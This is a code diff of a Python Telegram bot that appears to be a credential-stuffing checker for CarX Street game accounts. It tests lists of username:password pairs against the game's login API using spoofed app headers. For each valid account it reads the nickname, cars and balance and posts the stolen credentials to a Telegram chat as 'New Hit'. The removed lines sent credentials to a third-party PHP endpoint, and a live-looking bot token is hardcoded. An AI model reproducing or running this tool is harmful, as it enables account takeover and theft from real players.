@@ -5,6 +5,7 @@ session = requests.session()
 is_checking = False
 #——————————————————————#
 bot = telebot.TeleBot('6047075637:AAGV0Q3whE2suNgBKMtv-VROyxfnGOhNERw')
+print("BoT Started")
 #——————————————————————#
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -25,9 +26,7 @@ def start(message):
 		msg = bot.send_message(chat_id=chat_id,text="The Checking Started, Wait ⌛")
 #——————————————————————#
 		work = 0
-		cents = 0
 		fucked = 0
-		free = 0
 #——————————————————————#
 		for line in lines:
 			if not is_checking:return
@@ -35,30 +34,62 @@ def start(message):
 			try:
 				user, pas = line.split(':')
 				email = f"{user}:{pas}"
-				email1 = f"{user} • {pas}"	
+				email1 = f"{user} • {pas}"	#——————————————————————#
+				url = "https://carx-id-prod.carx-online.com/api/auth/login"
+				data = f"username={user}&password={pas}&project=STREET"
+				headers = {
+				'Host': 'carx-id-prod.carx-online.com',
+				'Content-Type': 'application/x-www-form-urlencoded',
+				'User-Agent': 'CarXStreet/717 CFNetwork/1404.0.5 Darwin/22.3.0',
+				'Connection': 'keep-alive',
+				'Accept': '*/*',
+				'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
+				'Accept-Encoding': 'gzip, deflate, br',
+				'X-Unity-Version': '2021.3.19f1'
+}
+				response = session.post(url,headers=headers,data=data)
+#—————————Request———————––#
+				if "token" in response.text:
+					token = response.json()["d"]["token"]
 #——————————————————————#
-				url = f"https://alflim.org/mos999/sms.php?email={user}&pass={pas}"
-				
-				response = session.post(url)
+					url2 = "https://street-prod.carx-online.com/str/v1/client/profiles/nickname"
+					headers2 = {
+						'User-Agent': 'CarXStreet/717 CFNetwork/1404.0.5 Darwin/22.3.0',
+						'Pragma': 'no-cache',
+						'Accept': '*/*',
+						'Host': 'street-prod.carx-online.com',
+						'Content-Type': 'application/json; charset=UTF-8',
+						'Accept-Encoding': 'gzip, deflate, br',
+						'Connection': 'keep-alive',
+						'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
+						'Authorization': f'Bearer {token}',
+						'Content-Length': '0',
+						'X-Unity-Version': '2021.3.19f1'
+				}
+					response2 = session.post(url2,headers=headers2)
+					nickname = response2.json()["d"]["nickname"]
 #——————————————————————#
-				if '"status": true' in response.text:
-					balance = response.json()['Balance']
-			
-					dollars = float(balance)
+					url3 = "https://street-prod.carx-online.com/str/v1/client/profiles"
+					headers3 = {
+	"Content-Type": "application/json; charset=UTF-8",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CarXStreet/717 CFNetwork/1404.0.5 Darwin/22.3.0",
+    "Connection": "keep-alive",
+    "Accept": "*/*",
+    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+    "Authorization": f"Bearer {token}",
+    "X-Unity-Version": "2021.3.19f1"}
+					response3 = session.get(url3,headers=headers3)
 #——————————————————————#
-					if balance == '0.00':
-						print(f'{email}> Working For Free')
-						free += 0
-					if len(balance) == 5:
-						bot.send_message(chat_id, f'{email}>Working but have cents: {dollars:.2f}$')
-						cents += 1
-					else:
-						bot.send_message(chat_id, f'{email}> Have dollars: {dollars:.2f}$')
-						work += 1	
+					cars = response3.json()["d"]["data"]["car_models"]["keys"]
+					balance = response3.json()["d"]["data"]["resources"]["soft"]["amount"]
+					cars = '\n  '.join(cars)
 #——————————————————————#
-				else:fucked += 1	
+					bot.send_message(chat_id,text=f"New Hit: {email}\n\nNickname: {nickname}\n\nCars:\n  {cars}\n\nBalance: {balance}")
+					work += 1	#——————————————————————#
+				else:fucked += 1
 #——————————————————————#
-				reply_markup = create_reply_markup(email1,work,cents,fucked,len(lines),free)
+				reply_markup = create_reply_markup(email1,work,fucked,len(lines))
 				bot.edit_message_text(
 	chat_id=chat_id,
 	message_id=msg.message_id,
@@ -72,17 +103,16 @@ def start(message):
 				timetowait = (retry_after_seconds['parameters']['retry_after'])
 				time.sleep(timetowait)
 		is_checking = False
+		bot.send_message(chat_id,"The check has completed successfully")
 		return
-	return 
+	return
 #——————————————————————#
-def create_reply_markup(line, work, cents, fucked, All,free):
+def create_reply_markup(line, work, fucked, All):
     
     markup = types.InlineKeyboardMarkup()
     
     email_button = types.InlineKeyboardButton(text=f"⌜ • {line} • ⌝", callback_data='none')
-    work_button = types.InlineKeyboardButton(text=f"⌯ H-Balance: {work}", callback_data='none')
-    cents_button = types.InlineKeyboardButton(text=f"Cents: {cents}", callback_data='none')
-    free_button = types.InlineKeyboardButton(text=f"Free: {free} ⌯", callback_data='none')
+    work_button = types.InlineKeyboardButton(text=f"⌯ Working: {work} ⌯", callback_data='none')
     dead_button = types.InlineKeyboardButton(text=f"⌞ • Fucked: {fucked}", callback_data='none')
     all_button = types.InlineKeyboardButton(text=f"All: {All} • ⌟", callback_data='none')
     team_button = types.InlineKeyboardButton(text="Dev Team", url='https://t.me/telemex')
@@ -91,7 +121,7 @@ def create_reply_markup(line, work, cents, fucked, All,free):
     stop_button = telebot.types.InlineKeyboardButton(text="STOP", callback_data="stop")
     
     markup.add(email_button)
-    markup.add(work_button,cents_button,free_button)
+    markup.add(work_button)
     markup.add(dead_button,all_button)
     markup.add(team_button,dev_button)
     markup.add(stop_button)
